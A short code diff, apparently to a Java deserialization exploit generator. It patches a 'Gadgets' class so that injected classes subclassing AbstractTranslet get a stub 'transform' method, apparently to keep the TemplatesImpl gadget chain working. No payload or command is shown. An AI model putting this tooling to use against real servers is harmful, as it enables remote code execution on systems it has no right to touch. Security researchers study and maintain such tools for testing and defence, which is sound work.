@@ -24,6 +24,8 @@ import java.util.HashMap;
 import java.util.Map;
 import javassist.ClassPool;
 import javassist.CtClass;
+import javassist.CtMethod;
+import javassist.NotFoundException;
 
 public class Gadgets {
     public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
@@ -103,6 +105,13 @@ public class Gadgets {
         CtClass superClass = pool.get(AbstractTranslet.class.getName());
         if (!clazz.subclassOf(superClass)) {
             clazz.setSuperclass(superClass);
+        }
+        try {
+            clazz.getDeclaredMethod("transform");
+        } catch (NotFoundException e) {
+            clazz.addMethod(CtMethod.make(
+                "public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xalan.internal.xsltc.runtime.SerializationHandler[] handlers) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {}",
+                clazz));
         }
         byte[] fixed = clazz.toBytecode();
         clazz.detach();
